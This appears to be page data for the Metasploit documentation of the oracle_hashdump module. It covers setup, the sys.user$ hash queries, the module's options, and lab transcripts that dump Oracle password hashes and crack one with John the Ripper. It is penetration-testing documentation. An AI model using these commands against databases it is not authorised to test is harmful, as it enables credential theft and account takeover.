{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/auxiliary/scanner/oracle/oracle_hashdump","result":{"data":{"moduleMetadataJson":{"id":"c953b7d3-e320-5bf3-a7f9-255a882e0194","name":"Oracle Password Hashdump","fullname":"auxiliary/scanner/oracle/oracle_hashdump","description":"This module dumps the usernames and password hashes\n          from Oracle given the proper Credentials and SID.\n          These are then stored as creds for later cracking using auxiliary/analyze/jtr_oracle_fast.\n          This module supports Oracle DB versions 8i, 9i, 10g, 11g, and 12c.","rank":300,"fields":{"detailsSlug":"/modules/details/auxiliary/scanner/oracle/oracle_hashdump","documentationSlug":"/modules/documentation/auxiliary/scanner/oracle/oracle_hashdump"},"documentation":{"html":"<h2 id=\"preparation-6-steps\" style=\"position:relative;\"><a href=\"#preparation-6-steps\" aria-label=\"preparation 6 steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Preparation: 6 steps</h2>\n<ol>\n<li>Oracle DB XE (Express Edition) can be downloaded for free <a href=\"https://www.oracle.com/technetwork/database/database-technologies/express-edition/downloads/index.html\">here</a>.</li>\n<li>Install Oracle Database and create a database. Versions 8i through 12c are supported.</li>\n<li>\n<p>On your Oracle DB machine, make sure you can ping the DB server using the <code class=\"language-text\">tnsping [SID]</code> command. If <code class=\"language-text\">tnsping</code> is not in your path upon installation, you will have to locate it manually.</p>\n<ul>\n<li>On a Windows machine, for Oracle 11g, <code class=\"language-text\">tnsping.exe</code> is located at: <code class=\"language-text\">oracle_install\\app\\oracle\\product\\&lt;version, ie 11.2.0)\\server\\bin\\tnsping.exe</code>.</li>\n<li>On a Windows machine, for Oracle 12c and 18c, it is located at <code class=\"language-text\">%ORACLE_HOME%\\bin\\tnsping.exe</code>.</li>\n</ul>\n<p> After this command is run, if all is well, the output will look something like this (note the OK echoed at the end):</p>\n</li>\n</ol>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">```\nC:&gt; tnsping staticdb\n...\n\nUsed TNSNAMES adapter to resolve the alias\nAttempting to contact (DESCRIPTION = (ADDRESS = (PROTOCOL = TCP)(HOST = localhost)(PORT = 1521)) (CONNECT_DATA = (SERVER = DEDICATED) (SERVICE_NAME = staticdb)))\nOK (0 msec)\n```\n\nIf `tnsping` fails, make sure the listener is setup correctly.\nSee [this Oracle doc](https://docs.oracle.com/cd/E11882_01/network.112/e41945/listenercfg.htm#NETAG294) for more information about its configuration. </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<ol start=\"4\">\n<li>Make sure to create a user on the DB that has a known password, and sufficient privileges to select any table. This is necessary for getting the hashes.</li>\n<li>\n<p>Test that the module's hash query works locally. Once your user is created with sufficient privileges, connect to the DB as the user, and proceed to run the following query</p>\n<ul>\n<li>12c: <code class=\"language-text\">SELECT name, spare4 FROM sys.user$ where password is not null and name &lt;&gt; \\&#39;ANONYMOUS\\&#39;</code></li>\n<li>pre-12c: <code class=\"language-text\">SELECT name, password FROM sys.user$ where password is not null and name&lt;&gt; \\&#39;ANONYMOUS\\&#39;</code></li>\n</ul>\n</li>\n<li>Set up your MSF environment to support Oracle. You need gem ruby-oci8, as well as Oracle Instant Client.\n<a href=\"https://github.com/rapid7/metasploit-framework/wiki/How-to-get-Oracle-Support-working-with-Kali-Linux\">View the setup tutorial here</a></li>\n<li>Make sure you have a database connected to MSF (postgresql). This can be done through <code class=\"language-text\">msfdb</code> tool or through <code class=\"language-text\">db_connect</code> command in <code class=\"language-text\">msfconsole</code>.</li>\n</ol>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Start <code class=\"language-text\">msfconsole</code></li>\n<li>Do: <code class=\"language-text\">use auxiliary/scanner/oracle/oracle_hashdump.rb</code></li>\n<li>Do: <code class=\"language-text\">run</code></li>\n<li>If Oracle DB version is supported, the query will be attempted to get the hashes. Hash table is built and then saved as credentials.</li>\n<li>You may view saved credentials with <code class=\"language-text\">creds</code> command. These are used for cracking by module <code class=\"language-text\">jtr_oracle_fast</code>.</li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p>  <strong>DBPASS</strong>\nThe password to authenticate with. Change this from TIGER to the password of the privileged user created in step 4 of Preparation.</p>\n<p>  <strong>DBUSER</strong>\nThe username to authenticate with. Change this from SCOTT to the user you created who is granted privileges to select from the sys.user$ table</p>\n<p>  <strong>RPORT</strong>\nThe TNS port of the Oracle DB server. By default, Oracle uses port 1521. Double-check the port of your Oracle DB.</p>\n<p>  <strong>SID</strong>\nThe Service ID (of the database) to authenticate with. Change this to your SID (if you changed the SID from default upon installation).\nDefault is <code class=\"language-text\">ORCL</code> (default Oracle install value) or <code class=\"language-text\">XE</code> for free edition.</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"running-oracle-12c-on-a-local-windows-10-machine-and-msf5-on-ubuntu-for-windows-same-machine\" style=\"position:relative;\"><a href=\"#running-oracle-12c-on-a-local-windows-10-machine-and-msf5-on-ubuntu-for-windows-same-machine\" aria-label=\"running oracle 12c on a local windows 10 machine and msf5 on ubuntu for windows same machine permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Running Oracle 12c on a local Windows 10 machine, and MSF5 on Ubuntu for Windows (same machine)</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 auxiliary(scanner/oracle/oracle_hashdump) &gt; show options\nModule options (auxiliary/scanner/oracle/oracle_hashdump):\n\n   Name     Current Setting  Required  Description\n   ----     ---------------  --------  -----------\n   DBPASS   hunter2          yes       The password to authenticate with.\n   DBUSER   scott            yes       The username to authenticate with.\n   RHOST    127.0.0.1        yes       The Oracle host.\n   RHOSTS   127.0.0.1        yes       The target address range or CIDR identifier\n   RPORT    1522             yes       The TNS port.\n   SID      staticdb         yes       The sid to authenticate with.\n   THREADS  1                yes       The number of concurrent threads\n\nmsf5 auxiliary(scanner/oracle/oracle_hashdump) &gt; run\n\n[*] Server is running 12c\n[*] Hash table :\n Oracle Server Hashes\n====================\n\n Username               Hash\n --------               ----\n ...\n SCOTT                  S:BF6D4E3791075A348BA76EF533E38F7211513CCE2A3513EE3E3D4A5A4DE0;H:3814C74599475EB73043A1211742EE59;T:0911BAC55EEF63F0C1769E816355BE29492C9D01980DC36C95A86C9CE47F93790631DE3D9A60C90451CFF152E25D9E94F612A1493EC82AF8E3C4D0432B06BA4C2C693B932332BC14D2D66CEF098A4699\n ...\n \n[+] Hash Table has been saved\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\nmsf5 auxiliary(scanner/oracle/oracle_hashdump) &gt; creds\nCredentials\n===========\n\nhost       origin     service            public  private                                                                                                                                                                                                                                                               realm  private_type        JtR Format\n----       ------     -------            ------  -------      \n...                                                                                                                                                                                                                                                         -----  ------------        ----------\n127.0.0.1  127.0.0.1  1522/tcp (oracle)  SCOTT   S:BF6D4E3791075A348BA76EF533E38F7211513CCE2A3513EE3E3D4A5A4DE0;H:3814C74599475EB73043A1211742EE59;T:0911BAC55EEF63F0C1769E816355BE29492C9D01980DC36C95A86C9CE47F93790631DE3D9A60C90451CFF152E25D9E94F612A1493EC82AF8E3C4D0432B06BA4C2C693B932332BC14D2D66CEF098A4699         Nonreplayable hash  oracle12c</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>These hashes are then saved as credentials so that <code class=\"language-text\">jtr_oracle_fast</code> can crack them (using <a href=\"https://github.com/magnumripper/JohnTheRipper\">John The Ripper \"bleeding_jumbo\"</a>).</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 auxiliary(scanner/oracle/oracle_hashdump) &gt; use auxiliary/analyze/jtr_oracle_fast\nmsf5 auxiliary(analyze/jtr_oracle_fast) &gt; run\n...\n[*] Cracking oracle12c hashes in normal wordlist mode...\nUsing default input encoding: UTF-8\n[*] Cracking oracle12c hashes in single mode...\nUsing default input encoding: UTF-8\n[*] Cracked passwords this run:\n[+] SCOTT:hunter2\n...</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"oracle-18c-184-xe-on-windows-2012\" style=\"position:relative;\"><a href=\"#oracle-18c-184-xe-on-windows-2012\" aria-label=\"oracle 18c 184 xe on windows 2012 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Oracle 18c (18.4 XE) on Windows 2012</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">resource (oracle.rb)&gt; use auxiliary/scanner/oracle/oracle_hashdump\nresource (oracle.rb)&gt; set rhosts 1.1.1.1\nrhosts =&gt; 1.1.1.1\nresource (oracle.rb)&gt; set dbuser system\ndbuser =&gt; system\nresource (oracle.rb)&gt; set dbpass oracle\ndbpass =&gt; oracle\nresource (oracle.rb)&gt; set sid XE\nsid =&gt; XE\nresource (oracle.rb)&gt; run\n[-] Version 18c is not currently supported\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"oracle-11g-112-xe-on-windows-2012\" style=\"position:relative;\"><a href=\"#oracle-11g-112-xe-on-windows-2012\" aria-label=\"oracle 11g 112 xe on windows 2012 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Oracle 11g (11.2 XE) on Windows 2012</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">resource (oracle.rb)&gt; use auxiliary/scanner/oracle/oracle_hashdump\nresource (oracle.rb)&gt; set rhosts 1.1.1.1\nrhosts =&gt; 1.1.1.1\nresource (oracle.rb)&gt; set dbuser system\ndbuser =&gt; system\nresource (oracle.rb)&gt; set dbpass oracle\ndbpass =&gt; oracle\nresource (oracle.rb)&gt; set sid XE\nsid =&gt; XE\nmsf5 auxiliary(scanner/oracle/oracle_hashdump) &gt; set verbose true\nverbose =&gt; true\nmsf5 auxiliary(scanner/oracle/oracle_hashdump) &gt; run\n\n[*] Server is running version 11g\n[*] Hash table :\n Oracle Server Hashes\n====================\n\n Username          Hash\n --------          ----\n APEX_040000       S:03D9B47D20C9A9EC3023177D80C0EE2D1DCEDA619215C2405177CEFFEE76\n APEX_PUBLIC_USER  S:E8D8CCD600CBCEA08ACB158A502C5DA711B00146404621BB2F83E8997246\n APPQOSSYS         S:4237CCB702887B049107EE6D13C312123F40E3F51208B2B70D6DA92E621D\n CTXSYS            S:3548FDA49F84F2F7ECE4635BA0FD714EC2446723074ED6167F1CD9B6EDFB\n DBSNMP            S:59354E99120C523F77232A8CCFDE5E780591FCE14109EEE2C86F4A9B4E8F\n DIP               S:1E4C37D0E8DC2E556D3C02A961ACEF1500B315D076BE13E578D1A28FC757\n FLOWS_FILES       S:A3657555975A9F7527C4B97637734D74465C592B9D231CA3DAB100ED5865\n HR                S:F437C1647EBCEB1D1FB4BB3D866953B4BF612B343944B899E061B361F31B\n MDSYS             S:F337C5D6300E3F8CDEDE0F2B2336415EAAE098A700A35E6731BF1370657E\n ORACLE_OCM        S:1575D1C89A1AACFE161ED788D2DC59CF6C57AE3B6CCC341D831AAF5BC447\n OUTLN             S:142AD444D8A63983FF69C77DBFD3E60947C14237AEC71031E24F5228D44C\n SYS               S:BFAF1ED5A8D39CC10D07DAF03A175C65198359874DAD92F081BE09B89162\n SYSTEM            S:D88BA08B353EC52E1EFD8433DF623773ACE3F81B7294BBC2E5C22CDD32F5\n XDB               S:88D6BE2B593143BD5AE5185C564826F9213E71361230D3360E36C3FF55D2\n XS$NULL           S:6C4F97FF654AE30BCD9BDBB3007EF952B5943F0A9ED491455E9FB185D8A1\n\n[+] Hash Table has been saved\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"c953b7d3-e320-5bf3-a7f9-255a882e0194"}}}